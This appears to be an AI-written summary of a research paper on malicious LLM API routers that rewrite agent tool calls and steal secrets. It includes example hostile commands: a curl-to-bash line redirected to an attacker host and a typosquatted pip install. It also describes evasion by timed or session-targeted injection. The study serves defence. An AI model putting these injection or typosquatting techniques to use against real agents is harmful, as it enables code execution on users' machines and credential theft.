# Your Agent Is Mine: Measuring Malicious Intermediary Attacks on the LLM Supply Chain

**arXiv**: 2604.08407v1
**Retrieved**: 2026-04-15

---

## Authors & Affiliations

| Author | Affiliation |
|--------|-------------|
| Hanzhi Liu | University of California, Santa Barbara |
| Chaofan Shou | Fuzzland |
| Hongbo Wen | University of California, Santa Barbara |
| Yanju Chen | University of California, San Diego |
| Ryan Jingyang Fang | World Liberty Financial |
| Yu Feng | University of California, Santa Barbara |

Primary affiliation: UCSB (3 of 6 authors).

---

## Abstract (Verbatim)

> Large language model (LLM) agents increasingly rely on third-party API routers to dispatch tool-calling requests across multiple upstream providers. These routers operate as application-layer proxies with full plaintext access to every in-flight JSON payload, yet no provider enforces cryptographic integrity between client and upstream model. We present the first systematic study of this attack surface. We formalize a threat model for malicious LLM API routers and define two core attack classes, payload injection (AC-1) and secret exfiltration (AC-2), together with two adaptive evasion variants: dependency-targeted injection (AC-1.a) and conditional delivery (AC-1.b). Across 28 paid routers purchased from Taobao, Xianyu, and Shopify-hosted storefronts and 400 free routers collected from public communities, we find 1 paid and 8 free routers actively injecting malicious code, 2 deploying adaptive evasion triggers, 17 touching researcher-owned AWS canary credentials, and 1 draining ETH from a researcher-owned private key. Two poisoning studies further show that ostensibly benign routers can be pulled into the same attack surface as they process end-user requests using leaked credentials and weakly configured peers: intentionally leaked OpenAI keys and weakly configured decoys have processed 2.1B tokens from these routers, exposing 99 credentials across 440 Codex sessions, and 401 sessions already running in autonomous YOLO mode, allowing direct payload injection. We build Mine, a research proxy that implements all four attack classes against four public agent frameworks, and use it to evaluate three deployable client-side defenses.

---

## 1. Methodology

### Router Collection

| Channel | Count | Source |
|---------|-------|--------|
| Paid routers | 28 | Taobao, Xianyu, Shopify storefronts |
| Free routers | 400 | Public community links using sub2api and new-api templates |
| **Total** | **428** | |

### Testing Protocol

1. **Account Registration**: Researchers registered controlled accounts on each router service.
2. **Sandboxed Agent Execution**: Routed traffic through a sandboxed agent environment executing:
   - Randomized custom tasks
   - TerminalBench 2.0 benchmark tasks
3. **Monitoring**: The system inspected returned tool-call payloads for:
   - Network callbacks (outbound connections to attacker servers)
   - File-system modifications
   - Process-tree anomalies
4. **Classification**: A dedicated analysis agent classified each router's behavior as **benign** or **malicious**.

### Targeted Tool Calls

The primary injection targets were shell-execution tool calls:
- `Bash`
- `run_command`

Benign tool calls used for evaluation included `Read`, `Grep`, `Glob`, and `Edit`.

### Poisoning Studies (Two Arms)

1. **Credential Leak Study**: An OpenAI API key owned by researchers was intentionally leaked on public forums. Researchers observed downstream abuse: who used it, what they did, and whether it was absorbed into malicious router pipelines.

2. **Weak-Router Decoy Study**: Researchers deployed deliberately vulnerable router decoys (Sub2API, CLIProxyAPI, etc.) to measure exploitation and downstream credential exposure through poisoned routers.

Both studies were observational. Credentials were revoked upon completion.

---

## 2. Attack Vectors (Four Classes)

### AC-1: Response-Side Payload Injection

**Mechanism**: The malicious router intercepts the LLM's response and rewrites a tool-call payload before it reaches the client, enabling arbitrary code execution.

**Example**:

~~~
nOriginal (benign):  curl -sSL https://get.example.com/cli.sh | bash
Modified (malicious): curl -sSL https://attacker****.sh | bash
~~~

**Impact**: Full remote code execution on the agent's host machine.

### AC-2: Passive Secret Exfiltration

**Mechanism**: The router silently reads and extracts secrets from plaintext traffic (API keys, system prompts, environment variables) without altering any payload. The user sees no visible change in behavior.

**Impact**: Credential theft, proprietary prompt extraction, silent surveillance.

### AC-1.a: Dependency-Targeted Injection (Evasion Variant)

**Mechanism**: Specializes AC-1 to target package-install commands. The router swaps a legitimate dependency name with an attacker-controlled typosquatted package, creating a durable supply-chain foothold.

**Example**:

~~~
Original:  python -m pip install requests flask pyyaml
Modified:  python -m pip install reqeusts flask pyyaml
~~~

Note the subtle typo: `requests` → `reqeusts`. The attacker publishes a malicious package under the typosquatted name.

**Impact**: Persistent backdoor installed via the Python/Node package ecosystem.

### AC-1.b: Conditional Delivery (Evasion Variant)

**Mechanism**: Activates payload injection only under specific conditions to evade detection during finite black-box audits. Conditions observed:

| Condition | Description |
|-----------|-------------|
| Warm-up period | Inject only after N prior requests (e.g., 50+) |
| User fingerprint | Target specific user patterns |
| Agent mode | Inject only during autonomous (YOLO) sessions |
| Project language | Target Rust or Go projects specifically |

**Impact**: Evades shallow smoke testing while targeting high-value sessions.

---

## 3. Statistics

### Router Audit Results

| Metric | Value |
|--------|-------|
| Total routers tested | 428 |
| Paid routers | 28 |
| Free routers | 400 |
| Actively injecting malicious code | 9 (1 paid + 8 free) |
| Deploying adaptive evasion triggers | 2 |
| Accessed researcher-owned AWS canary credentials | 17 |
| Drained ETH from researcher wallet | 1 |

### Poisoning Study Results

| Metric | Value |
|--------|-------|
| Tokens processed via leaked keys/decoys | ~2.1 billion |
| Visible traffic exposed | 13 GB |
| Unique credentials leaked | 99 |
| Codex sessions observed | 440 |
| Sessions in autonomous YOLO mode | 401 / 440 (91.1%) |
| Unauthorized access attempts on decoys | 40,000+ |
| Unique IPs | 147 |
| Unique JA3 fingerprints | 6 |

### Open-Source Router Ecosystem Scale

| Template | GitHub Stars |
|----------|-------------|
| new-api | 25,400 |
| one-api | 30,500 |

### Leaked Key Study

| Metric | Value |
|--------|-------|
| Tokens billed from single leaked OpenAI key | 100 million |
| Codex sessions spawned from leaked key | 7+ |

---

## 4. Specific Examples of Malicious Behavior

### Active Malicious Routers (9 total)

1. **Paid router (1)**: Actively injected malicious shell commands into tool-call responses.
2. **Free routers (8)**: Various injection and exfiltration behaviors.

### Adaptive Evasion Examples (2 routers)

- **Warm-up trigger**: One router injected malicious code only after 50+ prior requests. A finite smoke test of 10 or 20 requests would detect nothing.
- **Context-aware targeting**: Another router restricted injection to autonomous "YOLO mode" sessions targeting Rust or Go projects — precisely the sessions where tool execution is auto-approved without user confirmation.

### Credential Abuse

- **17 routers** accessed and used researcher-owned AWS canary credentials for follow-on activity.
- **1 router** drained ETH from a researcher-controlled Ethereum wallet.

### Poisoning Chain

The decoy study demonstrated a full attack chain:
1. Researchers deployed weak decoy routers.
2. Attackers compromised the decoys.
3. Compromised decoys were absorbed into active router relay paths.
4. End-user traffic was routed through the poisoned nodes.
5. 401 of 440 sessions were in autonomous YOLO mode — meaning tool execution was auto-approved with no human review.
6. Direct payload injection into production agent sessions.

---

## 5. Cryptocurrency Theft Incident

**Correction**: The user's prompt referenced a "$500K wallet drain." The paper does **not** report a $500K loss.

**What actually happened**:

- Researchers provisioned Ethereum decoy private keys with **nominal balances only**.
- One malicious router drained ETH from a researcher-owned private key.
- **The value lost was below US$50 at the time of transfer.**

The significance is not the dollar amount but the proof-of-concept: a malicious LLM router successfully exfiltrated a cryptocurrency private key from plaintext traffic and executed an on-chain drain autonomously.

---

## 6. Defenses & Recommendations

### Immediate Client-Side Defenses Evaluated

The researchers built **Mine**, a research proxy implementing all four attack classes against four public agent frameworks, and evaluated three defenses:

#### Defense 1: Fail-Closed Policy Gate

- **Mechanism**: Blocks high-risk tool actions (shell execution, file writes) by default.
- **Detection rate**: 100% for AC-1, 100% for AC-1.a
- **False positive rate**: 1.0%
- **Limitation**: Brittle — blocks legitimate tool usage. Does not address AC-2 (passive exfiltration) or AC-1.b (conditional delivery).

#### Defense 2: Response-Side Anomaly Screening

- **Mechanism**: Flags suspicious tool calls by detecting anomalous patterns in response payloads.
- **Detection rates**:
  - AC-1: 89.0%
  - AC-1.a: 50.0%
  - AC-1.b: 50.9%
- **False positive rate**: 6.7% (at the chosen operating point)
- **Limitation**: Less effective against targeted and conditional variants.

#### Defense 3: Append-Only Transparency Logging

- **Mechanism**: Preserves tamper-proof audit trail of all responses for post-hoc forensic analysis.
- **Role**: Audit tool, not a direct block. Enables detection of compromises after the fact.

### Defense Effectiveness Summary

| Defense | AC-1 | AC-1.a | AC-1.b | AC-2 | FP Rate |
|---------|------|--------|--------|------|--------|
| Policy Gate | 100% | 100% | Partial | No | 1.0% |
| Anomaly Screening | 89.0% | 50.0% | 50.9% | No | 6.7% |
| Transparency Log | Audit | Audit | Audit | Audit | N/A |

### Long-Term Recommendation

The authors' primary recommendation is **provider-supported cryptographic integrity**:

- **Provider-signed response envelopes**: The upstream LLM provider cryptographically signs the tool-call response. The client can verify that the tool call it executes matches exactly what the model produced — any router tampering would invalidate the signature.
- **Minimal fields** for the signed envelope are specified in Table 11 of the paper.

This is the only defense that addresses all four attack classes including passive exfiltration (AC-2).

---

## 7. Agent Frameworks Tested

The following frameworks were used in the evaluation:

- **Claude Code** (Anthropic)
- **Codex** (OpenAI)
- **OpenClaw**
- Plus a fourth unnamed public agent framework

---

## 8. Additional Quantitative Findings

### Threshold Sensitivity (Anomaly Screening)

Table 9 in the paper provides a threshold sweep for response-side anomaly screening. The chosen operating point (6.7% FP) balances detection coverage against usability.

### Feature Ablation

Table 10 shows feature ablation results at the 6.7% FP operating point, identifying which features contribute most to anomaly detection performance.

### Paper Structure

| Element | Identifier |
|---------|------------|
| Tables | 1-11 |
| Figures | 1-6 |
| Attack taxonomy | Table 1 |
| Measurement datasets | Table 2 |
| Main outcomes | Table 3 |
| AC-1.b conditions | Table 4 |
| Defense coverage | Table 6 |
| Related work comparison | Table 7 |
| Defense evaluation corpora | Table 8 |
| Threshold sensitivity | Table 9 |
| Feature ablation | Table 10 |
| Provider-signed envelope fields | Table 11 |

### Key Insight

The core vulnerability is architectural: LLM API routers sit as application-layer proxies with **full plaintext access** to every in-flight JSON payload. No major provider currently enforces cryptographic integrity between client and upstream model. This means any router in the path can read, modify, or inject content without detection.

---

## Threat Model Summary

```
Client (Agent) → [Malicious Router] → Upstream LLM Provider
                       ↓
              Reads all plaintext traffic
              Modifies tool-call responses
              Exfiltrates secrets
              Injects arbitrary code
```

The router is a trusted intermediary that has zero cryptographic accountability.
